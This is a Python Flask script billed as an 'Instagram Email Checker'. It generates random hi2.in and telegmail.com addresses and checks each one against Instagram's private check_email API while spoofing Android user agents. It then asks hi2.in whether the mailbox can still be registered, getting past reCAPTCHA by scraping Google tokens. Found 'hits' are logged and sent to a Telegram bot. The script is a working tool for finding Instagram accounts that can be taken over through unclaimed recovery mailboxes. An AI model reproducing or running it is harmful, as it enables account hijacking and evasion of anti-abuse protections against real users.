import sys
import os
import requests
import string
import random
import time
from threading import Thread, Lock 
import subprocess
import uuid
import json
import logging
from flask import Flask, request, jsonify
from datetime import datetime, timedelta
import signal
import gc

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Install dependencies if needed
def install_dependencies():
    try:
        import h2
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "h2"])
    
    try:
        import httpx
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "httpx", "httpx[http2]"])
        import httpx
    
    try:
        from cfonts import render
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "cfonts==1.5.2"])
        from cfonts import render

# Install dependencies
try:
    install_dependencies()
except Exception as e:
    logger.warning(f"Some dependencies failed: {e}")

# Create Flask app for web service
app = Flask(__name__)

# ============ OPTIMIZED STARTER PLAN SETTINGS ============
THREAD_COUNT = 3  # Optimal for 512MB RAM
DELAY_BETWEEN_REQUESTS = 1.5  # Avoid rate limiting
MAX_RETRIES = 2
BATCH_SIZE = 10  # Process in batches
REQUEST_TIMEOUT = 25
MEMORY_CLEAN_INTERVAL = 100  # Clean memory every 100 requests

# Track start time
start_time = time.time()
request_count = 0
last_memory_clean = time.time()

# Global variables
used_usernames = set()
lock = Lock()
hit = 0
badig = 0
badmil = 0
dead = 0
is_running = False
error_count = 0
total_requests = 0

# ============ END OF STARTER PLAN SETTINGS ============

def memory_cleanup():
    """Clean memory to prevent leaks on Starter Plan"""
    gc.collect()
    if len(used_usernames) > 10000:
        with lock:
            # Keep only recent entries
            temp_set = set(list(used_usernames)[-5000:])
            used_usernames.clear()
            used_usernames.update(temp_set)

def banner():
    try:
        from cfonts import render
        output = render('Insta Checker', colors=['red', 'yellow'], align='center')
        print(output)
        print("=" * 60)
        print("        DEV / @sm4ss    |    Starter Plan Optimized")
        print("=" * 60)
    except:
        print("=" * 60)
        print("        Instagram Email Checker    |    Starter Plan")
        print("        DEV / @sm4ss")
        print("=" * 60)

# Get token from environment variable
TOKEN = os.environ.get('BOT_TOKEN', '')
CHAT_ID = os.environ.get('CHAT_ID', '')
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', '')

if not TOKEN or not CHAT_ID:
    logger.warning("BOT_TOKEN or CHAT_ID not set. Telegram notifications disabled.")

def generate_android_ua():
    devices = [
        {"brand": "samsung", "model": "SM-G973F", "device": "beyond1", "board": "exynos9820"},
        {"brand": "samsung", "model": "SM-A536B", "device": "a53x", "board": "s5e8825"},
        {"brand": "samsung", "model": "SM-S918B", "device": "dm1q", "board": "kalama"},
        {"brand": "Google", "model": "Pixel 6", "device": "raven", "board": "raven"},
        {"brand": "Google", "model": "Pixel 7", "device": "panther", "board": "panther"},
        {"brand": "OnePlus", "model": "NE2213", "device": "lemonadep", "board": "lahaina"},
        {"brand": "Xiaomi", "model": "M2012K11G", "device": "venus", "board": "kona"},
    ]
    device = random.choice(devices)
    android_version = random.choice(["11", "12", "13", "14"])
    api_level = {"11": "30", "12": "31", "13": "33", "14": "34"}[android_version]
    dpi = random.choice(["420", "440", "450", "480"])
    width, height = "1080", "2400"
    instagram_ver = random.choice(["330.1.0.45.110", "331.0.0.45.110", "332.0.0.45.110"])
    locale = random.choice(["en_US", "ar_SA", "fr_FR", "es_ES"])
    random_num = random.randint(300000000, 400000000)
    
    ua = (f"Instagram {instagram_ver} Android ({api_level}/{android_version}; "
          f"{dpi}dpi; {width}x{height}; {device['brand']}; {device['model']}; "
          f"{device['device']}; {device['board']}; {locale}; {random_num})")
    return ua

def send_telegram_message(msg, retry=0):
    """Send message with retry logic"""
    if not TOKEN or not CHAT_ID:
        return False
    try:
        response = requests.get(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            params={"chat_id": CHAT_ID, "text": msg},
            timeout=5
        )
        return response.status_code == 200
    except Exception as e:
        if retry < MAX_RETRIES:
            time.sleep(1)
            return send_telegram_message(msg, retry + 1)
        logger.error(f"Telegram send failed: {e}")
        return False

def info(user):
    global hit, request_count
    dom = user.split("@")[1]
    hit += 1
    request_count += 1
    
    msg = f'''
╔═══════════════════╗
║   ✅ HIT FOUND    ║
╠═══════════════════╣
║ 📧 {user}
║ 🌐 {dom}
╠═══════════════════╣
║ By @sm4ss
╚═══════════════════╝
'''
    try:
        # Save to file
        with open('hits.txt', 'a') as ff:
            ff.write(f"{datetime.now().isoformat()} - {user}\n")
        
        # Send Telegram notification
        send_telegram_message(msg)
        
        # Webhook if configured
        if WEBHOOK_URL:
            try:
                requests.post(WEBHOOK_URL, json={"email": user, "domain": dom}, timeout=5)
            except:
                pass
            
    except Exception as e:
        logger.error(f"Error saving hit: {e}")

def solve_recaptcha():
    """Get recaptcha token with timeout"""
    try:
        anchor_url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=ar&v=TnA7HacJFoBWt9hnlunBlYfK&size=invisible&anchor-ms=20000&execute-ms=30000&cb=x552vg5lfo2g"
        params = anchor_url.split('?')[1]
        
        headers = {
            'authority': 'www.google.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://hi2.in/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'upgrade-insecure-requests': '1',
            'user-agent': generate_android_ua(),
        }
        
        r = requests.get(f'https://www.google.com/recaptcha/api2/anchor?{params}', headers=headers, timeout=10)
        if 'recaptcha-token" value="' not in r.text:
            return None
            
        recaptcha_token = r.text.split('recaptcha-token" value="')[1].split('"')[0]
        
        payload = f"v={params.split('v=')[1].split('&')[0]}&reason=q&c={recaptcha_token}&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=ar&size=invisible"
        
        reload_headers = {
            "User-Agent": generate_android_ua(),
            "Referer": "https://www.google.com/recaptcha/api2/anchor",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        
        resp = requests.post('https://www.google.com/recaptcha/api2/reload', data=payload, headers=reload_headers, timeout=10)
        if 'resp","' in resp.text:
            return resp.text.split('resp","')[1].split('"')[0]
        return None
    except Exception as e:
        logger.debug(f"Recaptcha error: {e}")
        return None

def check_email(email):
    global badmil, error_count, total_requests
    total_requests += 1
    
    if "@" not in email:
        return

    domain = email.split("@")[1]
    prefix = email.split("@")[0]

    solve = solve_recaptcha() 
    if not solve:
        badmil += 1
        return

    data = {
        'domain': domain,
        'prefix': prefix,
        'recaptcha': solve,
    }
    headers = {
        'User-Agent': generate_android_ua(),
        'Accept': "application/json, text/plain, */*",
        'Accept-Language': "ar,en-US;q=0.9,en;q=0.8",
        'Origin': "https://hi2.in",
        'Referer': "https://hi2.in/",
        'authorization': "Basic bnVsbA==",
    }
    try:
        response = requests.post("https://hi2.in/api/custom", data=data, headers=headers, timeout=REQUEST_TIMEOUT)
        res = response.json()
        if "already taken" in str(res) or res.get('status') == 'error':
            badmil += 1
        else:
            info(email)    	
    except Exception as e:
        logger.debug(f"Check email error: {e}")
        badmil += 1
        error_count += 1

def rest(email):
    global bad_user, hit, badig, badmil, dead, error_count, total_requests
    
    try:
        url = "https://i.instagram.com/api/v1/users/check_email/"
        id_data = str(uuid.uuid4())
        
        payload = {
            "email": email,
            "device_id": id_data,
            "guid": id_data,
            "_csrftoken": "".join(random.choices(string.ascii_lowercase + string.digits, k=32))
        }
        
        headers = {
            'User-Agent': generate_android_ua(),
            'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '936619743392459'
        }
        
        # Try HTTPX first, fallback to requests
        try:
            import httpx
            with httpx.Client(http2=True, timeout=REQUEST_TIMEOUT) as client:
                response = client.post(url, data=payload, headers=headers)
                if 'email_is_taken' in response.text:
                    check_email(email)
                else:
                    badig += 1
        except Exception as e:
            # Fallback to requests
            logger.debug(f"HTTPX fallback: {e}")
            response = requests.post(url, data=payload, headers=headers, timeout=REQUEST_TIMEOUT)
            if 'email_is_taken' in response.text:
                check_email(email)
            else:
                badig += 1
                
    except Exception as e:
        logger.debug(f"Rest error: {e}")
        dead += 1
        error_count += 1
    
    # Periodic memory cleanup
    global last_memory_clean
    if total_requests % MEMORY_CLEAN_INTERVAL == 0:
        memory_cleanup()
        last_memory_clean = time.time()

def users():    
    while is_running:
        try:
            # Generate username
            user1 = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(5))
            user2 = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
            chosen_user = random.choice([user1, user2])
                  
            with lock:
                if chosen_user in used_usernames:
                    continue
                used_usernames.add(chosen_user)
                
            chos = random.choice(["@hi2.in", "@telegmail.com"])
            email = chosen_user + chos
            rest(email)
            
            # Delay between requests
            time.sleep(DELAY_BETWEEN_REQUESTS)
            
        except Exception as e:
            logger.error(f"Thread error: {e}")
            time.sleep(5)  # Wait on error

@app.route('/')
def home():
    uptime = time.time() - start_time
    return jsonify({
        "status": "running" if is_running else "stopped",
        "plan": "Starter (Optimized)",
        "hits": hit,
        "bad_ig": badig,
        "bad_mail": badmil,
        "dead": dead,
        "errors": error_count,
        "total_checked": hit + badig + badmil + dead,
        "total_requests": total_requests,
        "is_running": is_running,
        "threads": THREAD_COUNT,
        "uptime": str(timedelta(seconds=int(uptime))),
        "bot_configured": bool(TOKEN and CHAT_ID),
        "memory_usage": f"{len(used_usernames)} cached emails"
    })

@app.route('/start')
def start():
    global is_running
    if not is_running:
        is_running = True
        for _ in range(THREAD_COUNT):
            Thread(target=users, daemon=True).start()
        send_telegram_message("✅ Checker started successfully!")
        return jsonify({
            "status": "started", 
            "threads": THREAD_COUNT,
            "message": f"Checker started with {THREAD_COUNT} threads"
        })
    return jsonify({"status": "already running", "message": "Checker is already running"})

@app.route('/stop')
def stop():
    global is_running
    if is_running:
        is_running = False
        send_telegram_message("⏹️ Checker stopped")
        return jsonify({"status": "stopped", "message": "Checker stopped gracefully"})
    return jsonify({"status": "not running", "message": "Checker is not running"})

@app.route('/stats')
def stats():
    uptime = time.time() - start_time
    total = hit + badig + badmil + dead
    return jsonify({
        "hits": hit,
        "bad_ig": badig,
        "bad_mail": badmil,
        "dead": dead,
        "errors": error_count,
        "total_checked": total,
        "hit_rate": f"{(hit / total * 100):.2f}%" if total > 0 else "0%",
        "efficiency": f"{(total / (total_requests + 1) * 100):.2f}%" if total_requests > 0 else "0%",
        "threads": THREAD_COUNT,
        "uptime": str(timedelta(seconds=int(uptime)))
    })

@app.route('/config')
def config():
    return jsonify({
        "threads": THREAD_COUNT,
        "delay": DELAY_BETWEEN_REQUESTS,
        "max_retries": MAX_RETRIES,
        "timeout": REQUEST_TIMEOUT,
        "batch_size": BATCH_SIZE,
        "memory_clean_interval": MEMORY_CLEAN_INTERVAL,
        "plan": "Starter (Optimized)"
    })

@app.route('/health')
def health():
    global is_running
    uptime = time.time() - start_time
    return jsonify({
        "status": "alive",
        "is_running": is_running,
        "uptime": str(timedelta(seconds=int(uptime))),
        "threads": THREAD_COUNT,
        "total_checked": hit + badig + badmil + dead,
        "memory_cache": len(used_usernames)
    })

# Error handler
@app.errorhandler(404)
def not_found(e):
    return jsonify({"error": "Endpoint not found"}), 404

@app.errorhandler(500)
def server_error(e):
    return jsonify({"error": "Internal server error"}), 500

if __name__ == "__main__":
    banner()
    
    # Log configuration
    logger.info(f"Starter Plan Optimized Configuration:")
    logger.info(f"  - Threads: {THREAD_COUNT}")
    logger.info(f"  - Delay: {DELAY_BETWEEN_REQUESTS}s")
    logger.info(f"  - Timeout: {REQUEST_TIMEOUT}s")
    logger.info(f"  - Memory Clean: Every {MEMORY_CLEAN_INTERVAL} requests")
    
    # Configure bot
    if TOKEN and CHAT_ID:
        logger.info(f"✅ Bot configured with token: {TOKEN[:10]}...")
        send_telegram_message("🚀 Instagram Checker started on Render Starter Plan!")
    else:
        logger.warning("⚠️ Bot token or chat ID not configured.")
        logger.info("Set BOT_TOKEN and CHAT_ID environment variables for notifications.")
    
    # Auto-start on Render
    if os.environ.get('RENDER'):
        logger.info("✅ Running on Render.com - Auto-starting checker...")
        is_running = True
        for i in range(THREAD_COUNT):
            Thread(target=users, daemon=True).start()
            logger.info(f"  - Thread {i+1}/{THREAD_COUNT} started")
    
    # Start Flask app
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🌐 Starting web server on port {port}")
    app.run(host='0.0.0.0', port=port, threaded=True)
